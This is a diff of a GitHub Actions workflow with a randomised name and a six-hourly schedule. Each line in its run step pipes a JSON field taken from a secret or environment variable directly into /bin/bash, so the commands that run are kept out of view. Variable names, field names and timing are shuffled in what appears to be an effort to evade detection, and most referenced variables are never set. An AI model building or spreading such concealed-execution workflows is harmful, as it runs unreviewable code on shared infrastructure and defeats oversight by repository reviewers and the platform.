@@ -1,23 +1,31 @@
 name: huashuaibei3217
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 5/6 * * *'
+    - cron: '57 2/6 * * *'
 
-jobs:  # 26935
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huashuaibei3217
         env:
-          ybki96: ${{ secrets.ybki96 }}
+          zf69432: ${{ secrets.zf69432 }}
         run: |
-          echo $ybki96 | jq -r .tvdz53121 | /bin/bash
-          echo $gla5602 | jq -r .lidj1664 | /bin/bash
-          echo $eags2 | jq -r .dhrmn9 | /bin/bash
-          echo $aznhm243 | jq -r .vsxc4629 | /bin/bash
-          echo $yx576 | jq -r .bzj1 | /bin/bash
+          echo $zf69432 | jq -r .qy58 | /bin/bash
+          echo $aw073 | jq -r .cc259 | /bin/bash
+          echo $ls547 | jq -r .we6 | /bin/bash
+          echo $plduk01 | jq -r .frglu01799 | /bin/bash
+          echo $rrih0222 | jq -r .s635 | /bin/bash
+          echo $rzhzg984 | jq -r .nsx95 | /bin/bash
+          echo $rwem46492 | jq -r .eonh31 | /bin/bash
+          echo $xhh90971 | jq -r .coqpm1740 | /bin/bash
+          echo $nxiaa5 | jq -r .vhrmt9939 | /bin/bash
+          echo $o4985 | jq -r .wpp85755 | /bin/bash
+          echo $hjokh40 | jq -r .pcsvz0602 | /bin/bash
+          echo $xuq6 | jq -r .laugf6384 | /bin/bash
+          echo $wr31296 | jq -r .l1 | /bin/bash
+          echo $nblhp580 | jq -r .vgfjm1 | /bin/bash
+          echo $fbu813 | jq -r .uhyt7 | /bin/bash
 
